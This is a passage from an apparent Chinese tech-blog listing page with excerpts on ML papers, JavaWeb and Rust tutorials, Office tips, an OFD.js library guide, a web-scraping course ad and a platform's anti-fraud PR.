本研究调查了马尔可夫链蒙特卡罗 (MCMC) 采样在无监督最大似然 (ML) 学习中的效果。 我们的注意力仅限于非归一化概率密度族，其中负对数密度（或能量函数）是 ConvNet。 我们发现，之前研究中用于稳定训练的许多技术都是不必要的。 具有 ConvNet 潜力的 ML 学习只需要几个超参数，并且不需要正则化。 使用这个最小框架，我们确定了仅取决于 MCMC 采样实施的各种 ML 学习成果。
一方面，我们表明训练基于能量的模型很容易，该模型可以使用短期 Langevin 对真实图像进行采样。 即使 MCMC 样本在整个训练过程中比真正的稳态样本具有更高的能量，ML 也可以是有效且稳定的。 基于这一见解，我们引入了一种 ML 方法，该方法具有纯噪声初始化的 MCMC、高质量短期合成，以及与具有信息性 MCMC 初始化（例如 CD 或 PCD）的 ML 相同的预算。 与以前的模型不同，我们的能量模型可以在训练后从噪声信号中获得真实的高多样性样本。
另一方面，使用非收敛 MCMC 学习的 ConvNet 势不具有有效的稳态，并且不能被视为近似训练数据的非标准化密度，因为长期运行的 MCMC 样本与观察到的图像有很大差异。 我们表明，训练 ConvNet 学习真实图像稳态的潜力要困难得多。 据我们所知，所有先前模型的长期 MCMC 样本都失去了短期样本的真实性。 通过正确调整 Langevin 噪声，我们训练了第一个 ConvNet 电位，其中长期和稳态 MCMC 样本是真实图像。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24372ac3b134f26fa856e0060b91e739/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/662517880033ba2f5a7fefe81a54b5ea/" rel="bookmark">
			JavaWeb小项目练习(基于三层架构实现登录，对表增，删，改，查的操作)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 创建项目并修改项目结构 File-&gt;New-&gt;Project新建一个名为javaweb01的工程
1
2
javaweb01-&gt;New-&gt;Module新建一个名为MyManage的模块
1
2
将MyManage模块设置为支持web项目
1
2
将web项目重命名并移动到main路径下
配置pom文件(文件依赖,打包方式,以及支持加载的文件)
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.by&lt;/groupId&gt; &lt;artifactId&gt;javaweb&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;artifactId&gt;MyManage&lt;/artifactId&gt; &lt;!-- 项目打包方式--&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!-- 依赖Servlet--&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;servlet-api&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 依赖Mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.4.5&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 依赖mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 依赖log4j--&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.17&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 依赖jsp-api--&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt; &lt;artifactId&gt;jsp-api&lt;/artifactId&gt; &lt;version&gt;2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/662517880033ba2f5a7fefe81a54b5ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fd6b5edf1d85085d40310daf4d9128c/" rel="bookmark">
			【计算机图形学】NAP: Neural 3D Articulation Prior
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 这篇论文做了什么事，有什么贡献？2. Related Work铰接物体建模3D中的Diffusion model扩散模型 3. Pipeline铰接树参数化基于Diffusion的铰接树生成去噪网络 4. 实验评价铰接物体生成——以往做法与本文提出的新指标NAP捕捉到的铰接物体分布质量NAP是否足够高效？——消融实验NAP可以做一些什么应用？ 5. 总结6. 其他补充SE(3) transformationPositional Encoding位置编码 1. 这篇论文做了什么事，有什么贡献？ 本篇论文研究铰接物体的生成模型。目前已经有大量工作研究3D物体的生成、组合的生成、场景的生成，但是对于人类和机器人日常交互对象——铰接物体的生成则很少有人focus。
生成铰接物体不仅包括生成几何的分布和位置（铰接物体是由rigid part组成的，要生成这些几何分布及其所在的位置），还需要生成两个rigid part之间的相对运动（比如运动结构，铰接链等信息）。
困难（Challenge）在于：现有的铰接物体数据集中存在的铰接物体，存在着许多不同，如他们在rigid part的数量（比如门是两个rigid part，然后眼镜这些是三个rigid part）上不同，且存在着多样化的连接拓扑（不同铰接物体连接的方式可能有差异）和不同的关节运动类型（有prismatic，如抽屉那种，还有revolute，门和眼镜那种）
为了解决这些困难和挑战，本文做出了以下的贡献：
针对于铰接物体之间存在的如rigid part数量不同、连接拓扑和关节运动类型不同等这种种差异，论文提出了一种统一的parameterization方式来表示铰接物体，论文称这种表达方式为铰接树在这种参数化后的物体上，运用最近比较火的diffusion去噪概率模型来建模铰接物体的不规则分布通过一个图注意力机制去噪网络，来逐步交换这种参数化后的铰接物体图之间的边与节点之间的信息引入了一个新的度量指标来评估这个新的任务 2. Related Work 铰接物体建模 这方面的工作主要分成几个部分：铰接物体类别估计、铰接物体重建、铰接物体模拟、铰接物体生成。
类别估计方面的工作主要是从传感器观察中预测铰接关节状态（铰接角度和）和铰接参数（铰接类型、axis的位置和朝向信息、限制），使用的方法主要是概率模型、交互感知的方式、基于学习的推理。
重建方面就是重建物体的铰接属性和几何属性，使用的技术主要包括运动、基于学习的方法和隐式神经表示。这些方法主要是做表面重建，关节状态预测
本文主要是建立一个铰接物体的生成先验
3D中的Diffusion model扩散模型 作者聚焦于那些3D shape和运动的生成。
Shape：目前Diffusion models在生成点云、mesh、隐式表面、nerf和4D非网格shape上做的很好。但是Diffusion models生成shape的工作主要是focus在单一物体的level上，没有focus在具有运动结构的物体上。
Motion：最近有很多在铰接物体运动生成方面的运用。类似的工作还有基于text生成人体运动、音频驱动、场景感知、多人或动画领域等。Diffusion models for motion还被运用于策略规划，视觉电机控制，重新排列任务等。这些将Diffusion model运用在运动方面的工作大部分都基于已知的几何和已知的运动结构。我们与之不同，我们共同建模几何和运动结构先验来建立铰接物体。
3. Pipeline 铰接树参数化 要想使用diffusion model来进行铰接物体的处理，首先就应该将铰接物体以某种方式实现参数化。首先引入铰接树参数化法，这也是本文的一个contribution：每一个物体都被定义成一个图，并同时做出两个假设：
树assumption：假设图是一个无环连接图（每两个节点间最多只有一条边连接），且能够通过边走完整个图Screw关节：假设边是连接用的螺丝，最多只具有prismatic平移和revolute旋转中的一种性质，以此覆盖了大部分真实世界中的铰接物体 Node
如图所示，每一个rigid part在图中都会被表示为一个Node，每一个joint都有其初始的pose，对应于0°或者未展开的状态。
给定其中第 i i i个part，首先获得从局部坐标 y i y_i yi​经过SE(3)变换得到的全局坐标 y g = T g i y i y_g=T_{gi}y_i yg​=Tgi​yi​， T g i ∈ R 6 T_{gi}∈R^6 Tgi​∈R6
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fd6b5edf1d85085d40310daf4d9128c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54d0bbf3059c04d8f5c90e615da0cd2f/" rel="bookmark">
			用可视化案例讲Rust编程1. 怎么能学会Rust
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用可视化案例讲Rust编程 1. 怎么能学会Rust 如果要列举Rust的优势，恐怕写个十条八条是写不完的，而且不管写哪条优势，都有很多同学跳起来反驳，比如我们说Rust比C/C++内存安全，肯定有同学说C++ 20也支持内存安全，或者我写C++比斯特劳斯特卢普写得更好，写了十年没有发生过任何内存泄露……
但是，反过来，我要说Rust最大的问题，恐怕没人会反驳，包括我这种花了三次才入门，然后又做砸了两个项目才勉强算学会，能够进入工程级开发的新人老手……
那就是：难学！
Rust的学习曲线，号称是所有编程语言中最陡峭的，就连Rust基金会，都把降低学习曲线，当成Rust发展的当务之急：
原文地址：https://blog.rust-lang.org/inside-rust/2022/04/04/lang-roadmap-2024.html
（注意：不是2023才提，是每一年的roadmap，都特么要提一次，这玩意儿真的不好学……公认）
官方的说法：
many people report a sense of high "cognitive overhead" in using it, and "learning curve" remains the most common reason not to use Rust. The fact is that, even after you learn how the Rust borrow checker works, there remain a lot of "small details" that you have to get just right to get your Rust program to compile.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54d0bbf3059c04d8f5c90e615da0cd2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03d0dcf44fa4cbd88b791db168a5a4be/" rel="bookmark">
			pdb使用问题：*** ‘XXX.py‘ not found from sys.path
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 解决方法 主目录是main，其下有两个文件分别是run与model，那么可以使用相对路径，比如要加断点的这个文件是model/net.py，而你运行的文件是run/train.py，在run目录下运行train.py，此时你的os.getcwd()是run目录，那么可以使用tbreak ../model/net.py:64来给net.py加断点，b等命令同理。通过sys.path.append(path)来将目标文件的目录加入系统路径，比如将model文件路径加入后，可以直接tbreak net.py:64。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a85ffd38c03055d529fcb0457b544a8f/" rel="bookmark">
			元旦三天，用Python赚了4w！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		每年年末，是Python圈子里接私活的旺季，特别是在元旦假日这种数据暴增的时间段，爬虫采集、逆向破解类的私活订单会集中爆发，量大价高。几乎所有的圈内人都在趁着旺季接私活。
正好，我昨天就做了一单爬虫逆向私活，下午接单傍晚交付。
接到接口逆向的订单，了解客户需求，确认细节：
完成订单并交付，客户确认无误完成收货，四千到手：
按照往年经验，这段时间做爬虫逆向类私活赚几个W是轻松的。
当下各领域对爬虫服务的需求量虽说很大，但其对技术的要求可一点都不低，通常高价值的爬虫项目都需要攻破各类反爬虫措施才能完成。
公众号后台收到好多粉丝留言，全在问爬虫技术进阶与兼职变现方面的问题，包括逆向工程、逆向算法、Web逆向、传输加密、HOOK、cookie加密、webpack加密、JS混淆在内的，反爬虫破解相关技术点，是被问及最多的。
结合多年爬虫项目接单经验，这里给想学爬虫接单涨收入的朋友一个建议：
其实各家的反爬虫措施同质化严重，先吃透几套经典爬虫实战项目，再消化其中经验与规律，多练练手，熟悉之后能很容易攻破大厂反爬虫。
技术速成方案
考虑到高价值的爬虫项目都在名企内部，一般情况下接触不到，即使真有好项目，在缺乏指导的情况下学习也很不容易。
所以，要想快速搞定反爬虫，我建议直接来听一堂企业级爬虫技术的速成课程。
扫码加小助理免费报名
👇👇👇
搞定技术，涨收入！
官方特训费299元，本号粉丝有福利，立即报名可免费学习！
这是一套专讲爬虫逆向攻防的高阶技术实战课，迄今为止已帮助近三万学员快速进阶。本次课程将由国际大数据竞赛获奖大佬亲身指导，带领大家进行一线大厂高阶技术体系+APP\小程序\Web逆向攻防实战+技术变现路径指导的综合速成训练！
此次实战训练分为三节课程，是专为高阶爬虫技术速成而设计的，课程内包含多项业界难觅的真实项目，对应每一项案例都有保姆级的拆分详解，深入浅出极易学懂。
本次课程并不仅限于技术干货传授，更有技术大佬十余年积累的技术变现经验分享。顶尖名师的专业指导与规划，搭配最前沿的爬虫逆向实战项目边学边练，在实战中快速累积经验，熟悉之后即可开始尝试接单。
课程详情
第一节：
1、详解Web逆向工程中的逆向思维
2、详解数据接口的快速定位-区分结构化与非结构化
3、详解接口request的5大基本步骤校验
4、详解浏览器中的快速JS接口验证-合理化爬虫
5、详解JavaScript快速调试(XHR断点+关键字搜索+路径定位)
6、企业资讯公示平台-数据逆向实战
7、知名证券信息平台-请求头参数逆向实战
第二节：
1、详解一线互联网名企的主流cookie加密方式
2、详解加密cookie参数的定位方法
3、详解混淆js跟栈调试技巧与还原逻辑
4、海外科技巨头官网-静态cookie参数验证实战
5、大型采购服务平台-混淆版cookie多次验证实战
6、详解信息安全技术在加密领域的运用场景
7、详解名企常见瑞数安全流程的解析方式
第三节：
1、详解名企常见的JS混淆技术
2、详解网站反debugger与内存爆破
3、详解数组混淆与ob混淆还原流程
4、产业政策资讯平台-进制流参数逆向实战
5、详解高安全架构设计-反爬虫验证与风控
6、详解名企的常见反爬虫措施及其破解方式
7、详解爬虫技术变现的私活接单流程与方法
课程福利
参与报名并完成特训的朋友，可以免费获得一套价值7280的专属实战教程礼包！
学完速成干货课程，要第一时间拿大厂高阶项目实战巩固，进一步提升技术，这套教程就非常适合练手！
注意事项
Q：为什么无法添加小助理？
A：一下子很多人报名，小助理的微信可能会出现延迟，过几分钟再添加一次即可。
Q：真的是免费吗？
A:本公众号粉丝仅需0元即可学习，真实有效。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89744b43b945905dc7476fb0b6d548d7/" rel="bookmark">
			unity C# 中通俗易懂LINQ使用案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 从数组或列表中查询元素**：2. **排序与分组**：3. **连接多个数据源**：4. **聚合操作**：5. **分页查询**：6. **多条件查询**：7. **转换和投影（Select）**：8. **聚合函数（GroupBy 和 Aggregate）**：9. **组合查询（Concat）**：10. **Distinct 查询**：11. **元素存在性检查（Any 和 All）**：12. **Join 多个数据源**： C# 中的 LINQ语句可以使得我们使用简短的代码就可以完成排序、分类、查询等常用功能。以下是一些基本的 C# LINQ 使用案例：
1. 从数组或列表中查询元素**： 假设我们有一个整数数组，想要找出所有的偶数。
int[] numbers = { 5, 4, 1, 3, 9, 8, 6, 7, 2 }; var evenNumbers = numbers.Where(n =&gt; n % 2 == 0); foreach (var number in evenNumbers) { Console.WriteLine(number); } 上述代码使用 Where 方法过滤出所有偶数。
2. 排序与分组： 如果我们有一个学生类 Student 包含 Name 和 Grade 属性，并且有一个学生列表，我们可以按年级排序并分组。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89744b43b945905dc7476fb0b6d548d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a43e583d7d714e8ffb573c03754e9fad/" rel="bookmark">
			（已解决）word如何制作和引用参考文献
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 正文其他 一般使用latex，但是有的时候会遇到使用word的情况，这里记录一下word如何弄参考文献。 正文 1.首先复制你的参考文献到word里面，然后要编号，记住，一定要编号，否则到时候无法引用。
那么怎么编号呢？如下，先选中，然后点击编号，然后选择编号的样式，一般都是[1]的这种形式。
2.选中要插入引用的位置，光标移动到那里，然后点击引用，点击交叉引用。
这个时候，我们发现会弹出一个对话框，这些就是之前编过号的参考文献，你可以选择一个参考文献，然后点击插入，表示要在光标处引用它，然后就完成了。
可以看到，有了一个[1]，而且点击这个[1]可以跳转到第一篇参考文献。
其他 1.有人会问，我能不能复制那个引用[1]，然后改成[2]，然后就变成引用第2篇文章，这个格式上来说是可以，但是我好像试过，这样的话，点击那个[2]只会跳转到第一篇文章，也就是说你改成2，但是超链接其实是没有改的，所以最好不要这样复制，就光标位置继续插入引用就好了，也很快的。
2.有的人的引用是在右上角，例如像下面这样，怎么搞。其实你引用完之后得到[1]，这个东西已经和普通文本没有区别了，你可以随意更改，这种右上角的弄法，以及更改字体，更改颜色都和普通文本一模一样。
选中之后，这些都可以操作。
完结撒花 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f336fca3f4580cdd18030eb737ca4d14/" rel="bookmark">
			WEB：探索开源OFD.js技术应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、简述 OFD.js 是一个由开源社区维护的 JavaScript 库，专注于在浏览器中渲染和处理 OFD 文件。OFD 作为一种开放式的文档格式，被广泛应用于电子政务、电子合同等领域。OFD.js 的出现为开发者提供了一个强大的工具，使得在前端实现 OFD 文件的展示和交互变得更加简单和灵活。
2、技术特点 OFD 标准支持
OFD.js 严格遵循 OFD 标准，能够准确解析 OFD 文件，实现对各种 OFD 版本和规范的兼容性。
基于 Web 技术
OFD.js 利用 HTML5、Canvas 等标准的 Web 技术，实现在浏览器中高效渲染 OFD 文件。这种基于 Web 的设计使得 OFD.js 具备良好的跨平台性和兼容性。
多层次渲染
OFD 文件通常包含多个层次的图形元素，例如文字、图片、矢量图等。OFD.js 提供了多层次的渲染能力，确保在展示 OFD 文件时保持图像的清晰和准确。
交互性
OFD.js 支持对 OFD 文件中的交互元素进行处理，如超链接、表单等，使得用户能够在浏览器中更加直观地与 OFD 文件进行交互。
3、下载 OFD.js 作为一个开源项目，得到了全球开发者社区的关注和支持。这意味着你可以从开源社区中获得反馈、解决问题，并参与到 OFD.js 的开发和改进中。 网络上的版本很多，但是真正一直维护的比较少，这边推荐的也是比较经常维护的：
Gitee 地址：https://gitee.com/Donal/ofd.js
直接点击下载或者通过git指令下载：
git clone https://gitee.com/Donal/ofd.js.git 当前ofd预览有些以图片为主的ofd文件兼容性不是很好，如果有遇到这种Ofd无法打开可以使用以下开源插件：
git clone https://gitee.com/gaoxingzaq/ofdview.git 这个有水印和页数限制，能不能破解看你自己了哈，都是js脚本。
4、应用 OFD.js 设计简洁，以轻量化为目标，使得在浏览器中加载和渲染 OFD 文件时能够保持高性能。首先要在本地安装Nodejs环境。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f336fca3f4580cdd18030eb737ca4d14/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03526d330ada362e19a7c574e0f3a041/" rel="bookmark">
			outlook邮件群发单显技巧？群发怎么单显？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		outlook邮件群发单显如何设置？QQ邮箱怎么群发单显？ 在群发邮件时，如何让每个收件人只看到自己的名字，而不是其他人的名字，这就涉及到所谓的“单显”技巧。下面蜂邮EDM就为大家揭秘Outlook邮件群发单显的奥秘。
outlook邮件群发单显：默认行为 Outlook在群发邮件时，为了节省时间和资源，通常会使用一个统一的收件人列表。如果你不进行任何设置，每个收件人都能在邮件中看到所有的其他收件人。但在某些商务或私人场合，这样的显示方式可能会带来不便。
outlook邮件群发单显：技巧方法 手动替换：在添加收件人时，先输入自己的名字，然后再一个个添加其他收件人。这样，当你预览邮件时，会发现只有自己的名字被列出。但这种方式较为繁琐，不适合大量邮件群发。使用BCC功能：BCC是Outlook中的一个隐藏功能，它可以让你在邮件中添加一个“暗含”的收件人。通过BCC发送邮件时，除了发件人和抄送者外，其他收件人都不会看到其他人的名字。但需要注意的是，BCC的收件人仍然可以看到被BCC的人列表。利用规则和VBA宏：对于经常需要进行群发单显的用户，可以设置一些规则或使用VBA宏来实现这一功能。通过编写简单的脚本，你可以自动化这一过程，使得每次群发时都能自动隐藏其他收件人的名字。 outlook邮件群发单显：注意事项 避免滥用：虽然Outlook邮件群发单显功能很方便，但也要避免滥用。频繁地使用BCC或VBA宏可能会导致系统误判为垃圾邮件。遵循礼仪：在商务场合中，使用BCC或VBA宏时需要谨慎。确保你的行为不会引起其他人的不适或误解。测试备份：在进行任何邮件发送设置之前，建议先进行测试，并定期备份Outlook设置，以防数据丢失。 通过了解Outlook的默认行为、掌握实现单显的方法以及注意使用时的礼仪和安全问题，你就能更加高效、得体地进行邮件群发。想要做邮件群发的话，推荐试试“蜂邮EDM外贸版”，开发信群发邮件，拓展外贸业务，达到等比沟通率。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2cfa19e94b2e88eed875a72cdbc7cf7c/" rel="bookmark">
			通过Python对商品销售数据预测
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		资源下载地址：https://download.csdn.net/download/sheziqiong/85674274
资源下载地址：https://download.csdn.net/download/sheziqiong/85674274
预测商品销售数据 实验目的 通过使用一个具有挑战性的时间序列数据集，该数据集由每日销售数据，由俄罗斯最大的软件公司之一 1C 公司提供。
数据集中提供了 2013 年 1 月到 2015 年 10 月每日每个店铺中的商品历史销售数据。任务是为测试集预测每家商店销售的产品总量。请注意，商店和产品列表每个月都会略有变化。创建可以处理此类情况的强大模型是挑战的一部分。
要求：预测下个月（也就是 2015 年 11 月）一整个月每个商店中对应产品的的总销售额。
数据集分析 所有的数据都存储在/data 文件夹下，文件夹中共有六个文件，分别是
sales_train.csv- 训练数据集，包含了从 2013 年 1 月到 2015 年 10 月的销售历史数据。
test.csv- 测试数据集，该任务需要用训练集中的数据来预测 2015 年 11 月的销售数据。
sample_submission.csv- 一个提交样例。
items.csv- 关于商品的补充信息。
item_categories.csv - 关于商品类别的补充信息。
shops.csv- 关于店铺的补充信息。
文件中会包含以下条目：
ID-在测试集中表示（店铺，商品）的 id。
shop_id- 店铺的唯一标识符。
item_id-商品的唯一标识符。
item_category_id-商品类别的唯一标识符。
item_cnt_day- 商品的销售数量，需要预测商品的月销量。
item_price- 商品的现价。
date-以 dd/mm/yyyy 为格式的日期
date_block_num- 按照顺序的月份简写，期中 2013 年 1 月为 0，2013 年 2 月为 1，…，2015 年 10 月为 33。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2cfa19e94b2e88eed875a72cdbc7cf7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c8d7814f9f602c23f663b19f42fdc71/" rel="bookmark">
			2024 广州国际汽车智能底盘技术展览会
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2024 广州国际汽车智能底盘技术展览会
时间：2024年5月15日-17日 地点：广州保利世贸博览馆 (PWTC Expo)
亚洲领先的汽车智能底盘技术专业展会！
本展汇集了各类与车联网相关的IT解决方案、应用程序及服务等。汽车制造商，汽车零部件供应商及整车企业用户等聚集一堂，寻找新的供应商及合作伙伴。
展会简介：
广州国际汽车智能底盘技术展览会是 AUTO TECH 2024 华南展专题展之一，将于2024年5月15日-17日在广州保利世贸博览馆盛大举办，将和汽车电子技术、车用功率半导体技术、智能座舱技术、轻量化技术/材料、EV/HV技术、测试测量技术以及自动驾驶技术等联袂呈现。届时将汇集全球500多家领先参展商向广大汽车工程师展示智能底盘集成、转向系统、电子技术、底盘部件加工等产品。同时组委会邀请诸如广汽、日产、丰田、本田、比亚迪、特斯拉、小鹏、蔚来、理想、东风、长安、上汽、吉利、长城、奇瑞、通用、奔驰、宝马 、大众、一汽、博世、大陆、麦格纳、电装、德赛西威、华为技术等汽车OEM厂商及Tier 1 &amp; 2 零部件供应商的上万名采购、技术工程师汇聚一堂，参加展会。
展示范围：
底盘集成：新能源汽车底盘、轿车底盘、商用车底盘技术等
智能化、电子化底盘技术：底盘线控系统、自动转向技术、 自适应巡航控制系统、 泊车辅助系统（ PLA）、 ABS/ASR/ESP集成控制系统、 自适应巡航控制系统(ACC)、 胎压监控系统(TPMS)、可调阻尼控制系统（ ADC）、车道偏离和驾驶警示系统 、自动紧急制动系统（ AEB）、电子驻车（ APB）、轮毂电机；
传动系统：离合器、变速器、传动轴、驱动桥、主减速器、差速器、半轴；
制动系统：制动器、制动总泵、真空助力器、制动油管、制动片、制动盘；
转向系统：转向机、方向盘、转向轴、减震器、转向节、转向助力泵、转向节臂、拉杆；
行驶系统：车架、车桥、悬架、轮胎、车轮
加工工艺及设备：机加工、焊接、冲压、涂装、压铸、装配、机器人自动化；
应用材料及辅料：铝合金、工程塑料、镁合金、钛合金、复合材料、高强度钢、碳纤维材料。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/affae04acb5bfbaa081286dddc680f3a/" rel="bookmark">
			Soul CEO张璐及团队多方合力，完善网络安全治理体系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		近年来,网络诈骗犯罪层出不穷,成为社会的一大顽疾。与大家传统认知中“老年人和中年人是被骗最多的人群”不同,随着骗术的不断发展,如今被骗的主体人群反而是上网最多的年轻人,据2022年4月的统计数据,全国遭受电信网络诈骗的人群18~35岁的年轻人占比最多,超过50%。在这种背景下,作为深受年轻人喜爱的社交平台,Soul App自2016年上线以来,在Soul CEO张璐的带领下积极行动,坚持从技术、形式创新出发,持续为年轻人筑牢反诈防火墙,成为网络安全的守护者和反诈骗的先锋。
创新反诈宣传形式
Soul深知影视作品对社会观念的引导作用,为此,他们借助热门电影《鹦鹉杀》的热度,邀请了相关影片参演嘉宾和Soul反诈中心一起宣传安全反诈知识。在平台内搜索“诈骗”“杀猪盘”等关键词时,用户将看到《Soul星防诈骗指南》和Soul反诈中心的科普帖置顶显示,引导用户学习反诈知识,增强警惕意识。此前,在《孤注一掷》上线时,Soul还曾邀请上海市反诈中心、浦东反诈中心民警与用户一同参与包场观影活动,将“反诈课堂”搬到电影院,通过线上线下联动的方式,宣传反诈知识。
这是Soul持续推出的系列反诈举措的一部分。基于平台内用户群体多为Z世代的生态特点,在Soul CEO张璐的带领下,Soul持续创新反诈方式。如平台首创“反诈群聊课堂”,联动站内用户共同以rap、绘画、脱口秀、歌曲弹唱等方式传播反诈知识,在互动和共创中寓教于乐。
全方位的反诈手段
Soul通过技术提升和创新,不断加强风险控制,建立了安全、高效的反诈风控体系。该平台采用了多种手段,包括文本、语音、图像和视频等媒介信息识别能力,自建网图人像黑库和诈骗犯文本器模型,有效识别和封锁了大量引用网络自拍、炫富图片的账号。同时,Soul CEO张璐与团队还在平台上设置了多种反诈预警提醒,用户一旦接收到高危关键词的消息,必须在通过防诈骗知识答题后才能解锁阅读,此举保障了用户的信息安全。
截至目前,Soul已上线六大风控技术手段和500多种场景布控反诈策略,多维度专项保障用户的网络安全。
此外,据Soul 2023年第一季度生态安全报告显示,Soul新增定向叫醒机制,对于有疑似欺诈行为的账号所触及的用户及时进行预警提醒,包括软件内弹窗提醒,软件外短信以及电话提醒,对于受害人画像命中用户定向推送反诈内容,提升反诈意识。Soul还将每年的5-6月设置为反诈专项月,举办系列活动,以此实现反诈宣传的全面渗透。
用户共治营造清朗生态
用户是平台生态建设的重要参与者,在持续推出安全举措的同时,Soul也积极联合广大用户共同营造绿色、清朗、温暖的互联网环境。一方面,Soul在Soul CEO张璐的带领下成立了反诈先锋组织,邀请用户成为反诈先锋榜样。这些先锋不仅在发现盗图、黑灰产和疑似诈骗的人员时第一时间举报,还在平台内通过主动发帖实现反诈宣传科普,真正实现人人参与反诈。另一方面,Soul还发起了风纪委和护星圆的招募活动,用户通过多人投票判定违规内容,保障了平台的友好社区氛围。
数据显示,截至目前已有2万+位Souler成为风纪委成员,日均超3000位Souler参与其中。此外,还有众多用户积极报名成为护星圆,与Soul一起维护真实、友好的社区氛围,形成了平台治理的新合力。
多方合力,构建治理体系
近年来,随着互联网的发展,各类新型网络诈骗甚至逐渐精准化、智能化,诈骗分子手段层出不穷,更需要群策群力共同应对。为此,Soul在Soul CEO张璐带领下与主流即时通讯平台等外部力量合作,对黑灰产进行强力整治,切断了不法分子导流的链条。此外,Soul还与相关权威机关建立了长效联动机制。在与工信部、网信、公安等部门的联合指导下,Soul建立反诈专项小组,积极推动联防联控机制的深入,并且配合公安机关破获了多个犯罪团伙,取得了显著的成果。
Soul App积极响应社会需求,不断加大反诈骗宣传力度,构筑了一个安全、友好的社交网络环境,为用户提供了可靠的交流平台。未来,相信在Soul CEO张璐及其团队的不懈努力下,Soul将继续携手用户,通过多方合作,构建更为完善的网络治理体系,共同守护网络安全,为用户提供更加安全、舒适的社交环境。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce3b967385f1a05d145a10e5816f6b7b/" rel="bookmark">
			微信商户号证书和密钥设置详细教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.先进入微信商户平台扫码登录微信商户号
微信商户平台
2.进入账户中心-API安全
3.申请API证书
3.1申请证书时按指引下载这个工具，这个工具里面包含你的证书信息
3.2 按指引安装该证书，安装完成以后证书会下载到你电脑的本地文件目录
4. 设置APIV2密钥
完成
在使用微信支付时需要用到的就是下载到你电脑的本地文件目录中的 cert_pem 文件和 key_pem 文件，还有密钥。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfebcc3df6eba0054f5d5d23b037dd0b/" rel="bookmark">
